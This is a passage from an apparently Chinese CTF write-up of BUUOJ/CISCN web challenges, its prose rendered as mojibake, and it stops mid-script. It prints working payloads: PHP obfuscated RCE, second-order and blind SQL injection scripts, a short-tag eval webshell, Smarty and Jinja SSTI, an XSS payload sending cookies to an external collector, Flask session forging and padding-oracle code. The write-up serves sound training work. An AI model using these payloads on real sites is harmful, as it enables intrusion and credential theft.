1234$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$pi&#x3D;hex2bin(5f474554);$pi&#x3D;_GET;$$pi&#x3D;$_GET; æ•…æœ€åpayload 1&#x2F;?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥æ„é€  1exec(getallheaders()&#123;1&#125;) åœ¨headersé‡ŒåŠ ä¸Š 11:cat &#x2F;flag è¿™ä¸€é¡¹æ‰§è¡Œ 1$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) ç”±äºç»“æœæ˜¯echoè¿”å›çš„ï¼Œä¸Šé¢ä½¿ç”¨é€—å·å¯ä»¥å°†ä¸¤ä¸ªç»“æœéƒ½æ‰“å°å‡ºæ¥ã€‚å…¶ä»–æ€è·¯åŒ…æ‹¬ç›´æ¥æ„é€ RCEè¯­å¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ²¡æœ‰ä¸Šé¢çš„æ–¹æ³•ç”¨èµ·æ¥èˆ’æœã€‚çœ‹åˆ°ç½‘ä¸Šè¿˜æœ‰å…¶ä»–éå¸¸æœ‰æ„æ€çš„è§£æ³•ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ã€‚ CyberPunk(äºŒæ¬¡æ³¨å…¥)ä¸Šæ¥index.phpä¸­ç»™äº†å§“åï¼Œç”µè¯ï¼Œåœ°å€ä¸‰ä¸ªæ¡†æ¥å¡«ã€‚åŒæ—¶è¿˜æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼šæŸ¥è¯¢ï¼Œä¿®æ”¹ï¼Œåˆ é™¤ã€‚ç”±äºæŸ¥è¯¢è¿™ä¸€ä¸ªæ“ä½œéƒ½åªè¦å§“åç”µè¯ï¼Œæˆ‘çŒœæµ‹å‰©ä¸‹çš„åœ°å€è¿™ä¸ªå‚æ•°å¯èƒ½æ˜¯é€šè¿‡è¾“å…¥å§“åç”µè¯å¯¹åœ°å€è¿›è¡ŒæŸç§è§¦å‘å¼æ³¨å…¥ã€‚åŸºæœ¬å¯ä»¥çŒœæµ‹æ˜¯sqlæ³¨å…¥é¢˜å‹ã€‚ ä»æºç å¤„å¾—åˆ°ä¸€ä¸ªfileå‚æ•°ã€‚æœæ–­æ–‡ä»¶åŒ…å«è¯»åˆ°æºç ï¼šindex.php 1234567891011121314&lt;?phpini_set('open_basedir', '/var/www/html/');$file = $_GET[\"file\"];$file = (isset($_GET['file']) ? $_GET['file'] : null);if (isset($file))&#123; if (preg_match(\"/phar|zip|bzip2|zlib|data|input|%00/i\",$file)) &#123; echo('no way!'); exit; &#125; @include($file);&#125;?&gt; search.php 1234567891011121314151617181920212223242526272829303132&lt;?phprequire_once \"config.php\"; if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"phone\"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = \"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'\"; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); if(!$row) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = \"&lt;p&gt;å§“å:\".$row['user_name'].\"&lt;/p&gt;&lt;p&gt;, ç”µè¯:\".$row['phone'].\"&lt;/p&gt;&lt;p&gt;, åœ°å€:\".$row['address'].\"&lt;/p&gt;\"; &#125; else &#123; $msg = \"æœªæ‰¾åˆ°è®¢å•!\"; &#125;&#125;else &#123; $msg = \"ä¿¡æ¯ä¸å…¨\";&#125;?&gt; change.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once \"config.php\";if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"address\"]) &amp;&amp; !empty($_POST[\"phone\"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $address = addslashes($_POST[\"address\"]); $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = \"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'\"; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id']; $result = $db-&gt;query($sql); if(!$result) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = \"è®¢å•ä¿®æ”¹æˆåŠŸ\"; &#125; else &#123; $msg = \"æœªæ‰¾åˆ°è®¢å•!\"; &#125;&#125;else &#123; $msg = \"ä¿¡æ¯ä¸å…¨\";&#125;?&gt; delete.php 123456789101112131415161718192021222324252627282930313233&lt;?phprequire_once \"config.php\";if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"phone\"]))&#123; $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = 'no sql inject!'; &#125;else&#123; $sql = \"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'\"; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $result = $db-&gt;query('delete from `user` where `user_id`=' . $row[\"user_id\"]); if(!$result) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $msg = \"è®¢å•åˆ é™¤æˆåŠŸ\"; &#125; else &#123; $msg = \"æœªæ‰¾åˆ°è®¢å•!\"; &#125;&#125;else &#123; $msg = \"ä¿¡æ¯ä¸å…¨\";&#125;?&gt; å®¡è®¡æºç åé‡ç‚¹å…³æ³¨addressæœ‰æ— æ³¨å…¥ï¼Œå‘ç°é¢˜ç›®éƒ½åªå¯¹å‰ä¸¤ä¸ªå‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶æœªæ£€æŸ¥addressã€‚åŒæ—¶addressåªç»è¿‡äº†ä¸€æ¬¡addslashes()å°±è¢«å­˜å‚¨ï¼Œè¿™æ˜¯ç»å…¸çš„äºŒæ¬¡æ³¨å…¥çš„ä½¿ç”¨åœºæ™¯ã€‚åŠ ä¸Šè§¦å‘æ–¹å¼ï¼š 12345678if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id']; $result = $db-&gt;query($sql); if(!$result) &#123; echo 'error'; print_r($db-&gt;error); exit; å›æ˜¾ä»¥errorçš„å½¢å¼è¢«æ‰“å°å‡ºæ¥ï¼Œè¯æ˜æˆ‘ä»¬éœ€è¦ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚å…·ä½“å½¢å¼æ˜¯ï¼Œæˆ‘ä»¬æäº¤å§“åï¼Œç”µè¯ï¼Œåœ°å€ä¸‰ä¸ªå‚æ•°ï¼Œå¹¶åœ¨åœ°å€ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚ä¹‹ååœ¨change.phpå†æ¬¡æäº¤ç›¸åŒå§“åç”µè¯ä¸éšä¾¿å†™åœ°å€ï¼Œå³å¯è§¦å‘updateæ‰§è¡ŒæŠ¥é”™æ³¨å…¥ã€‚æ ¹æ®updateè¯­å¥æ„é€ payload: 11&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)# è²Œä¼¼é¢˜ç›®flagä¸åœ¨åº“é‡Œï¼Œçœ‹wpå‘ç°æ˜¯/flag.txtã€‚æœ‰ç‚¹è¿·æƒ‘ã€‚éœ€è¦æ³¨æ„æŠ¥é”™æ³¨å…¥å­—æ®µæ•°çš„é™åˆ¶ï¼Œè°ƒæ•´substr()çš„åä¸¤ä¸ªå‚æ•°ã€‚ Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰å¼€å§‹ä»robots.txtå¾—åˆ°çš„image.php.bakçš„æºç æ³„éœ²ä¿¡æ¯ 123456789101112131415161718&lt; ?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); å‘ç°æœ‰sqlæ³¨å…¥ç‚¹ï¼Œä¸»è¦è¦åº”å¯¹ä¸¤ä¸ªå‚æ•°çš„è¿‡æ»¤ 12$id&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path); è€ƒè™‘ä½¿ç”¨\\0ï¼Œå¹¶åœ¨pathä¸­æ³¨å…¥ã€‚è¿™æ ·æˆ‘ä»¬çš„sqlè¯­å¥å°±å˜æˆäº†: 1select * from images where id&#x3D;&#39; or path&#x3D;&#39; or 1&#x3D;1# å‰©ä¸‹çš„å¸ƒå°”ç›²æ³¨å³å¯ 12345678910111213141516171819import requestsflag=''for i in range(1,50): a=0 print(i)#ciscnfinal, images,users for j in range(32, 128):#select group_concat(column_name) from information_schema.columns where table_name=database() #url = \"http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or%20id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),\"+str(i)+\",1))=\"+str(j)+\",1,0)%23\" url = \"http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or%20id=if(ascii(substr((select group_concat(password) from users),\"+str(i)+\",1))=\"+str(j)+\",1,0)%23\" res = requests.get(url) if 'JFIF' in res.text: flag += chr(j) print(flag) a = 1 break if a==0: break æ³¨å…¥å¾—åˆ°usernameä¸passwordç™»å½•è¿›å…¥åå°ã€‚å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚ç®€å•fuzzä¸‹å‘ç°æ–‡ä»¶åä¼šè¢«å­˜å‚¨åˆ°å›ºå®šphpæ—¥å¿—æ–‡ä»¶ä¸­logs/upload.b888aaa68e9659c297c4b02084157cff.log.phpæ—¢ç„¶å¦‚æ­¤åªéœ€ä¸Šä¼ ä¸€å¥è¯ã€‚å‘ç°phpå…³é”®å­—è¢«æ‹¦ã€‚ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š 1&lt;?=@eval($_GET['byc']);?&gt; è¿™æ˜¯å› ä¸º 123456&#x2F;&#x2F;php.iniä¸­short_open_tag &#x3D; On &#x2F;&#x2F;é™¤&lt;?php ?&gt;ï¼Œå¯ä½¿ç”¨æ›´çµæ´»çš„è°ƒç”¨æ–¹æ³•&lt;? &#x2F;*ç¨‹åºæ“ä½œ*&#x2F; ?&gt;&lt;?&#x3D;&#x2F;*å‡½æ•°*&#x2F;?&gt; bypassæ‰åæ‰§è¡Œå‘½ä»¤system(&#39;cat /flag&#39;);å³å¯ åä¸œå—èµ›åŒº Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰è¿™é¢˜å¼€å§‹çœ‹çš„æˆ‘è´¼å¥‡æ€ªï¼Œå› ä¸ºæ•´ä¸ªç½‘ç«™è²Œä¼¼åªæ˜¯ä¸€ä¸ªapiæ¥å£ã€‚å…¶ä¸­å›æ˜¾æœ‰ä¸€éƒ¨åˆ†ååˆ†æ˜¾çœ¼å¼€å§‹è€ƒè™‘æ˜¯å¦å­˜åœ¨å…³äºxffå¤´çš„ä¿¡æ¯ã€‚ä½†æ˜¯æ²¡æµ‹å‡ºæ¥ã€‚å»ç½‘ä¸Šæœäº†æ³¢wpæç„¶å¤§æ‚Ÿã€‚åŸæ¥å…³é”®ç‚¹åœ¨ç½‘é¡µä¸‹æ–¹æç¤ºçš„Build With Smarty !Smartyæ˜¯ä¸€ç§phpç½‘é¡µå¼•æ“ï¼Œä¹Ÿå­˜åœ¨å¦‚pythonjinja2çš„sstiæ³¨å…¥ã€‚ åŒæ—¶å…¶ä½¿ç”¨æ–¹æ³•å¦‚{if cmd}{/if}å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚æ‰€ä»¥é¦–å…ˆbpé‡Œæ›´æ”¹xffåŒ…ï¼Œå°è¯•2,å‘ç°æ³¨å…¥æˆåŠŸï¼›ä¹‹åç›´æ¥ä»»æ„å‘½ä»¤æ‰§è¡Œå³å¯æ‹¿åˆ°flag 1&#123;file_get_contents(&#39;&#x2F;flag&#39;)&#125; åä¸œåŒ—èµ›åŒº Web2ï¼ˆå­˜å‚¨å‹xss+sqlæ³¨å…¥ï¼‰é¢˜ç›®ç®—æ˜¯æ¯”è¾ƒä¼ ç»Ÿçš„xssè§¦å‘æ¨¡å¼äº†ã€‚æ³¨å†Œç™»å½•åä¸€ä¸ªè¾“å…¥æ¡†å…è®¸æˆ‘ä»¬ä½¿ç”¨xsspayloadï¼Œè¿˜æœ‰ä¸€ä¸ªç•Œé¢è¾“å…¥éªŒè¯ç åè§¦å‘boté˜…è¯»ã€‚æˆ‘ä»¬ç›®æ ‡å°±æ˜¯æ‰“åˆ°adminçš„cookieã€‚ é¦–å…ˆå°è¯•æ€§å¼¹ä¸ªçª—ï¼Œç»“æœåœ¨é¡µé¢é‡Œçœ‹åˆ°ä¸ªè‡ªå·±æœ‰å¿ƒç†é˜´å½±çš„CSPé™åˆ¶ã€‚ 1&lt;meta http-equiv=\"content-security-policy\" content=\"default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'\"&gt; å¥½åœ¨cspè§„åˆ™ä¸ç®—æ¯”è¾ƒä¸¥æ ¼ã€‚å› ä¸º&#39;unsafe-inline&#39; &#39;unsafe-eval&#39;å…è®¸æˆ‘ä»¬åŠ è½½ä¸€æ®µå†…è”jsä»£ç æ‰§è¡Œã€‚è€Œè§£å†³è¿™ä¸ªçš„åŠæ³•åªéœ€ä½¿ç”¨window.location.hrefå°±å¯ç»•è¿‡ã€‚è¿™é‡Œå› ä¸ºæœ‰buuojæä¾›çš„xsså¹³å°ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ç”Ÿæˆçš„ä»£ç æ‰“ä¸€æ‰“çœ‹çœ‹ã€‚å‘ç°æœ‰è¿‡æ»¤ä¸è½¬æ¢ï¼Œä¼°è®¡å¾—å®ä½“ç¼–ç ç»•è¿‡ã€‚æŠŠxsså¹³å°ç”Ÿæˆçš„payloadæ”¹æˆå®ä½“ç¼–ç ï¼š(æ³¨æ„idå€¼æ˜¯ç”Ÿæˆä»£ç é‡Œçš„idï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯é¡¹ç›®åidåŠå¤©æ‰“ä¸åˆ°) 1(function()&#123;window.location.href='http://ip:port/index.php?do=api&amp;id=ex0I6K&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)(); 1&lt;svg&gt;&lt;script&gt;å®ä½“ç¼–ç payload&lt;/script&gt; æäº¤åè®¿é—®é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°å¹³å°æ˜¯èƒ½æ”¶åˆ°cookieçš„ï¼Œé‚£å°±ä¸éœ€è¦å…³å¿ƒå…¶ä»–çš„ï¼Œç›´æ¥å»åé¦ˆé¡µé¢è·‘æ®µè„šæœ¬çˆ†ç ´éªŒè¯ç æäº¤å³å¯ã€‚ç­‰å¾…botç‚¹å‡»é¡µé¢ï¼Œä¹‹åå¹³å°æ”¶åˆ°cookieä¿®æ”¹ç™»å½•è¿›å…¥admin.phpåå°ï¼Œä¸€ä¸ªæ˜æ˜¾çš„sqlæ³¨å…¥ç›´æ¥è”åˆæŸ¥è¯¢å³å¯ã€‚3ä¸ªå­—æ®µï¼Œå›æ˜¾ç¬¬2,3ä¸ª double secrect (ssti)åŸºæœ¬ä¸Šå”¬äººçš„æˆåˆ†æ¯”è¾ƒå¤§ã€‚å› ä¸ºä¸€å¼€å§‹è¿›å…¥é¢˜ç›®åªæœ‰ä¸€å¥Welcome To Find Secretï¼Œä¹‹åè®¿é—®robots.txtå‘ç°å±…ç„¶æŠ¥this is android ctfï¼Œè®©æˆ‘ä»¥ä¸ºçœ‹é”™é¢˜äº†ã€‚ä½†å…¶å®è®¿é—®secretè·¯ç”±å¹¶ä¼ å‚secretæ—¶ï¼Œå‘ç°ä¼šæœ‰å›æ˜¾ã€‚å½“å›æ˜¾å­—æ•°å¤šçš„æ—¶å€™å‡ºç°pythonæŠ¥é”™ï¼Œå¯ä»¥çŒœæµ‹æ˜¯sstiã€‚è¿™é‡Œæˆ‘å°è¯•ç›´æ¥ä¼ ä¸€æ®µä¸­æ–‡ï¼Œå…¶å®asciiç æ¯”è¾ƒå¤§çš„æ–‡å­—ä¹Ÿä¼šè§¦å‘æŠ¥é”™ï¼Œçˆ†å‡ºé‡è¦æºç ï¼š åŸæ¥æ˜¯æ®µåŠ å¯†ï¼Œè€Œä¸”çˆ†å‡ºçš„æºç è¿keyå€¼éƒ½ç»™äº†ã€‚é‚£ä¹ˆç›´æ¥RC4åŠ å¯†æˆ‘ä»¬çš„ssti payloadåŸºæœ¬å°±å®Œäº‹äº†ã€‚exp: 1234567891011121314151617181920212223242526272829303132333435import requestsimport urllibclass RC4: def __init__(self, key): self.key = key self.key_length = len(key) self._init_S_box() def _init_S_box(self): self.Box = [i for i in range(256)] k = [self.key[i % self.key_length] for i in range(256)] j = 0 for i in range(256): j = (j + self.Box[i] + ord(k[i])) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def crypt(self, plaintext): i = 0 j = 0 result = '' for ch in plaintext: i = (i + 1) % 256 j = (j + self.Box[i]) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] t = (self.Box[i] + self.Box[j]) % 256 result += chr(self.Box[t] ^ ord(ch)) return resulturl='http://7318e5d2-ecf4-4961-b115-4f1eb3b11c4a.node3.buuoj.cn/secret?secret='a = RC4('HereIsTreasure')cmd=\"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()&#125;&#125;\"payload = urllib.parse.quote(a.crypt(cmd))res = requests.get(url + payload)print(res.text) åä¸œå—èµ›åŒº Web4 (flask session cookieä¼ªé€ )è¢«æ²¡å¿…è¦çš„æƒ…å†µç»™æµªè´¹äº†æ—¶é—´â€¦â€¦ä¸»è¦æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œå¿ƒé‡Œè‹¦å•Šã€‚é¦–å…ˆé¢˜ç›®ç»™äº†ä¸€ä¸ªå‚æ•°å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œç”±äºè·¯ç”±åç§°ï¼Œå…ˆçœ‹ä¸‹æºç app.py 1234567891011121314151617181920212223242526272829303132333435# encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) app.debug = True @app.route('/') def index(): session['username'] = 'www-data' return 'Hello World! Read somethings' @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response' @app.route('/flag') def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else: return 'Access denied' if __name__=='__main__': app.run( debug=True, host=\"0.0.0.0\" ) å¯ä»¥çœ‹åˆ°åªè¦ä¼ªé€ session[&#39;username&#39;]çš„å€¼å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚ç”±äºè¿™é‡Œçš„éšæœºæ•°ç§å­SECRECT_KEYå¾ˆè½»æ¾å°±å¯ä»¥ä¼ªé€ ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šè„šæœ¬çˆ†ç ´å¹¶ç”Ÿæˆcookieå€¼ 1234567891011import flask_session_cookie_manager2import randommac = \"02:42:ae:00:d0:09\"random.seed(int(mac.replace(\":\", \"\"), 16))for x in range(1000): key = str(random.random() * 233) result = flask_session_cookie_manager2.FSCM.decode('eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XljQxQ.zBqq36UiMEIrykW9oqSlvg4wBkw', key) if 'error' not in result: result[u'username'] = 'fuck' print flask_session_cookie_manager2.FSCM.encode(key, str(result)) exit() ç†è®ºä¸Šæ”¹cookieå°±å®Œäº‹äº†ï¼Œä½†æ˜¯æˆ‘ç™½èŠ±äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œå› ä¸ºè™šæ‹Ÿæœºçš„py2çš„ç¯å¢ƒæœ‰é—®é¢˜ã€‚æœŸé—´è¿˜å‘ç°ï¼ŒåŸæ¥å‚æ•°ä¸å˜æ—¶ç”Ÿæˆçš„cookieä¹Ÿä¼šå› ä¸ºæ—¶é—´åŸå› è€Œä¸åŒã€‚å½“ç„¶è¿™å¹¶ä¸å½±å“ç»“æœã€‚åªè¦æ˜¯python2ç†è®ºä¸Šå°±æ²¡æœ‰é—®é¢˜ã€‚æœ€åè¿˜æ˜¯åœ¨vpsä¸Šè·‘çš„è„šæœ¬æ‰æ‹¿åˆ°flagâ€¦â€¦ PointSystem(PaddingOracle+cbcç¿»è½¬)é¢˜ç›®éš¾åº¦æŒºå¤§çš„ï¼Œå‰åè¿˜æ‹–äº†ä¸å°‘æ—¶é—´ï¼Œæœ€åå‚è€ƒäº†å‡ºé¢˜äººèµµå¸ˆå‚…çš„wpæ‰å‹‰å¼ºå†™å‡ºæ¥çš„ã€‚å…¶ä¸­æ¶‰åŠPaddingOracle+CBCç¿»è½¬æ”»å‡»çš„çŸ¥è¯†æ¶‰åŠå¯†ç å­¦ï¼Œè‡ªå·±æ‰€çŸ¥ç”šå°‘ï¼ŒåŸæ¥ä¹Ÿåªå¥—è¿‡è„šæœ¬åšè¿‡ä¸€é“paddingoracleçš„é¢˜ç›®ã€‚æ‰€ä»¥å…ˆæŠŠè§£é¢˜è¿‡ç¨‹æ”¾ä¸€ä¸‹ï¼ŒæŠ½ç©ºæŠŠpadding oracleç­‰ç­‰åŠ å¯†åŸç†ç†è§£ä¸‹ã€‚ é¦–å…ˆé¢˜ç›®ä»robots.txtä¸­è·å–ä¿¡æ¯ï¼Œè¿›å…¥swagger-ui.htmlï¼Œå¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šapiæ¥å£çš„ä½¿ç”¨ã€‚ä¸€å¼€å§‹å°è¯•èƒ½å¦ç›´æ¥åœ¨è¿™ä¸ªç•Œé¢è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚æ³¨å†Œæˆ–è€…pingä¹‹ç±»çš„ã€‚ä½†æ˜¯å‘ç°å¹¶ä¸å¯è¡Œã€‚ä¸è¿‡æˆ‘ä»¬æ—¢ç„¶çŸ¥é“æœ‰æ³¨å†Œæ¥å£ï¼Œç›´æ¥æŒ‰ç…§æ ¼å¼åˆ©ç”¨æ¥å£æ³¨å†Œä¸€ä¸ªè´¦å·å°±å¥½äº†ã€‚æ³¨å†Œåå°è¯•ç™»å½•ï¼Œå´æ„å¤–å‘ç°å­˜åœ¨æƒé™ä¸å¤Ÿçš„é—®é¢˜ã€‚ ä½†æ˜¯åœ¨burpsuiteä¸­æ„å¤–å‘ç°äº†é™¤äº†ä¸€ä¸ªç™»å½•çš„poståŒ…ï¼Œè¿˜æœ‰ä¸€ä¸ªgetè¯·æ±‚äº†æœªçŸ¥çš„apiå¹¶è¿”å›ä¿¡æ¯ã€‚å°†ç™»å½•æ‰€è¿”å›çš„ä¸€æ®µbase64è¿›è¡Œè§£ç å¾—åˆ°ï¼š 1&#123;\"signed_key\":\"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZOzOMzVHlzkkVTuw8vkgQOwMZ2B5Leaq0Gc+rzoKtQdjsiMrpsSBq/QvWKTHYKxBHN0JzlQd6bXhFdSUa4slA7g==\",\"role\":3,\"user_id\":1,\"payload\":\"CHAkpjTggDemZY7gzXBvbR2WeXJ47cfj\",\"expire_in\":1582905111&#125; è€Œå‰é¢çš„signed_keyä¹Ÿè¿›è¡Œbase64è§£ç çš„è¯ï¼Œä¼šå‘ç°å†…å®¹ç”±æ˜æ–‡+å¯†æ–‡ç»„åˆèµ·æ¥äº†ã€‚è¯´æ˜æœ‰å¯èƒ½æœåŠ¡å™¨é‡‡å–cbcæ¨¡å¼åŠ å¯†ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯paddingoracleç ´è§£å‡ºç»“æ„å¹¶cbcç¿»è½¬ä¸€ä¸‹ã€‚padding oracleexp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import timeimport requestsimport base64import jsonhost = \"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn\"def padding_oracle(key): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode['signed_key'] signed_key_decoded = base64.b64decode(signed_key) url = \"http://\" + host + \"/frontend/api/v1/user/info\" N = 16 total_plain = '' for block in range(0, len(signed_key_decoded) // 16 - 1): print(block) token = '' get = b\"\" cipher = signed_key_decoded[16 + block * 16:32 + block * 16] for i in range(1, N+1): for j in range(0, 256): time.sleep(0.2) padding = b\"\".join([(get[n] ^ i).to_bytes(1, 'little') for n in range(len(get))]) c = b'\\x00' * (16 - i) + j.to_bytes(1, 'little') + padding + cipher #print(c) token = base64.b64encode(c) user_key_json_decode['signed_key'] = token.decode(\"utf-8\") header = &#123;'Key': base64.b64encode(bytes(json.dumps(user_key_json_decode), \"utf-8\"))&#125; res = requests.get(url, headers=header) if 'å°‘å¥³' in res.text: print('404 error occured!') time.sleep(15.0) res = requests.get(url, headers=header) if res.json()['code'] == 206: get = (j ^ i).to_bytes(1, 'little') + get print(i,get) break plain = b\"\".join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, 'little') for i in range(N)]) print(plain.decode(\"utf-8\"), \"block=%d\" % block) total_plain += plain.decode(\"utf-8\") print(total_plain) return total_plainplain_text = padding_oracle(\"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY2lZV3YrYW9NZi9EV2hvU1laaVFpWTJkanlpV1hJbGNqM2FRTndmajdLNnpvZGwzcUhsb2lPakdxWGhCRTN6UHVTeDMwY2lPdlpMZm5ya2tDZ0ZWRXFRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoic3c4SHByRENncFJHRWZwYzMxY29KME1DR1NkRm90SlgiLCJleHBpcmVfaW4iOjE1ODI5ODYwODB9\")print(plain_text) ç”±äºpaddingéœ€è¦é¢‘ç¹è¯·æ±‚æœåŠ¡å™¨ï¼Œbuuçš„é¶æœºæœŸé—´ç»å¸¸å‡ºç°404ã€‚æ‰€ä»¥æˆ‘å¾—åœ¨æ¯æ¬¡å‡ºç°404æ—¶sleepåå¤šç§’â€¦â€¦å¤ªéš¾äº†ï¼Œè·‘äº†å¿«å‡ å°æ—¶æ‰å¥½ã€‚è·‘å®Œåå¾—åˆ°æ˜æ–‡ç»“æ„ 1&#123;\"role\":3,\"user_id\":2,\"payload\":\"sw8HprDCgpRGEfpc31coJ0MCGSdFotJX\",\"expire_in\":1582986080&#125; æ—¢ç„¶å¦‚æ­¤ï¼ŒæŠŠroleæ”¹ä¸º1åº”è¯¥å°±å¯ä»¥è§£å†³æƒé™é—®é¢˜ã€‚æ‰€ä»¥cbcç¿»è½¬ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport base64import jsonhost = \"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn\"def cbc_attack(key, block, origin_content, target_content): user_key_decode = base64.b64decode(key) 